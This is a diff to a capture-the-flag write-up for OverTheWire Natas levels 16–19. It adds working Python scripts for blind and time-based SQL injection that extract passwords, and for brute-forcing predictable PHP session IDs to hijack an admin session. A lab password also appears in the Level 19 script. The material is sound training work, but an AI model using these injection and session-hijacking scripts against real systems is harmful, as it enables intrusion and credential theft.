@@ -632,14 +632,14 @@ We're going to be using `Python` for this challenge since we need to perform a l
 import requests
 
 
-url = 'http://natas15.natas.labs.overthewire.org/index.php?username='
+url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16'
 auth = ('natas15', natas15_pass)
 
 def get_charset():
     alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
     charset = ''
     for char in alnum:
-        sqli = f'natas16" and password like binary "%{char}%'
+        sqli = f'" and password like binary "%{char}%'
         r = requests.get(url+sqli, auth=auth)
         if 'This user exists.' in r.text:
             charset += char
@@ -649,7 +649,7 @@ def get_password(charset):
     password = ''
     while True:
         for char in charset:
-            sqli = f'natas16" and password like binary "{password+char}%'
+            sqli = f'" and password like binary "{password+char}%'
             r = requests.get(url+sqli, auth=auth)
             if 'This user exists.' in r.text:
                 password += char
@@ -751,4 +751,301 @@ if __name__ == '__main__':
     charset = get_charset()
     password = get_password(charset)
     print(password)
+```
+
+## Level 17
+
+![natas17_index.jpg](screenshots/natas/natas17_index.jpg)
+
+[Sourcecode](http://natas17.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+```
+
+Alright, so we have another SQL challenge, but this time, it looks like the `echo` lines are commented out. We no longer have an output to determine whether our query was `true` or `false`. However, this doesn't mean we're out of luck just yet.
+
+We can take advantage of MySQL's [`SLEEP`](https://dev.mysql.com/doc/internals/en/sleep.html) command, which allows us to do a timing attack on SQL.
+
+[Asyncio](files/natas/natas17_async.py).\
+[Without Asyncio](files/natas/natas17.py):
+
+```python
+#!/usr/bin/env python3
+import requests
+from urllib.parse import urlencode
+
+
+url = 'http://natas17.natas.labs.overthewire.org/index.php?'
+auth = ('natas17', natas17_pass)
+
+def get_charset(sleep=1):
+    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+    charset = ''
+    for char in alnum:
+        sqli = ('natas18" and '
+               f'password like binary "%{char}%" and '
+               f'sleep({sleep})#')
+        payload = urlencode({'username': sqli})
+        r = requests.get(url+payload, auth=auth)
+        if r.elapsed.total_seconds() >= sleep:
+            charset += char
+    return charset
+
+def get_password(charset, sleep=1):
+    password = ''
+    while True:
+        for char in charset:
+            sqli = ('natas18" and '
+                   f'password like binary "{password+char}%" and '
+                   f'sleep({sleep})#')
+            payload = urlencode({'username': sqli})
+            r = requests.get(url+payload, auth=auth)
+            if r.elapsed.total_seconds() >= sleep:
+                password += char
+                break
+        else:
+            break
+    return password
+
+
+if __name__ == '__main__':
+    time = 1
+    charset = get_charset(time)
+    password = get_password(charset, time)
+    print(password)
+```
+
+## Level 18
+
+![natas18_index.jpg](screenshots/natas/natas18_index.jpg)
+
+[Sourcecode](http://natas18.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+}
+
+if($showform) {
+?>
+
+<p>
+Please login with your admin account to retrieve credentials for natas19.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<? } ?>
+```
+
+This next challenge requires us to log in as admin. Let's check the source code to see what it's doing to verify our identity.
+
+```php
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+```
+
+So in order to get it to print the credential for the next level, we need to pass this check:
+
+```php
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+```
+
+The [$_SESSION](https://www.php.net/manual/en/reserved.variables.session.php) is a `superglobal` variable which contains all of the session IDs in an array. Generally, when a new session is created, the server returns the session's ID as a cookie named `PHPSESSID`. Since HTTP is a stateless protocol, this cookie is how the server determines which session is associated to your request. For this challenge, it looks like we need to perform a session hijacking attack to steal the admin's session.
+
+If we look back at the source code, we see this:
+
+```php
+$maxid = 640;
+...
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+```
+
+Looks like the session ID is just a random integer between 1 and 640. Looks like we can just brute force the admin's session by checking every session ID in that range.
+
+[Asyncio](files/natas/natas18_async.py).\
+[Without Asyncio](files/natas/natas18.py):
+
+```python
+#!/usr/bin/env python3
+import re
+import requests
+
+
+url = 'http://natas18.natas.labs.overthewire.org/'
+auth = ('natas18', natas18_pass)
+
+def find_password():
+    for i in range(1,641):
+        cookies = {'PHPSESSID': str(i)}
+        r = requests.get(url, auth=auth, cookies=cookies)
+        if 'Username: natas19' in r.text:
+            password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
+            password = password_re.search(r.text).groupdict()['password']
+            return password
+
+
+if __name__ == '__main__':
+    print(find_password())
+```
+
+## Level 19
+
+![natas19_index.jpg](screenshots/natas/natas19_index.jpg)
+
+This time, we aren't given the source code. However, we do know that the challenge is similar to the last level. Let's try logging in as `admin` and checking what our session ID is set to:
+
+![natas19_1.jpg](screenshots/natas/natas19_1.jpg)
+
+This looks like a hex encoded string. Let's check:
+
+```bash
+$ echo 3335362d61646d696e | xxd -r -p
+356-admin
+```
+
+Looks like the format is the `<id>-<user>`. We can reuse our script from the last challenge for this.
+
+[Asyncio](files/natas/natas19_asnyc.py).
+[Without Asyncio](files/natas/natas19.py):
+
+```python
+#!/usr/bin/env python3
+import re
+import requests
+
+
+url = 'http://natas19.natas.labs.overthewire.org/'
+auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+
+def find_password():
+    for i in range(1,641):
+        cookies = {'PHPSESSID': f'{i}-admin'.encode().hex()}
+        r = requests.get(url, auth=auth, cookies=cookies)
+        if 'Username: natas20' in r.text:
+            password_re = re.compile('Password: (?P<password>[a-zA-Z0-9]{32})')
+            password = password_re.search(r.text).groupdict()['password']
+            return password
+
+
+if __name__ == '__main__':
+    print(find_password())
 ```
